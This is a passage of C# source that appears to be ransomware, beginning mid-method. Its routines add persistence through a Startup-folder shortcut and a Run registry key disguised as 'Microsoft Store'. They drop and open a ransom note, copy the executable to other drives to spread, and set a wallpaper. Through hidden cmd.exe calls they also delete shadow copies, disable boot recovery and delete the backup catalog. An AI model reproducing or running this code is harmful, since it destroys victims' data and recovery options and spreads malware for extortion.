		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
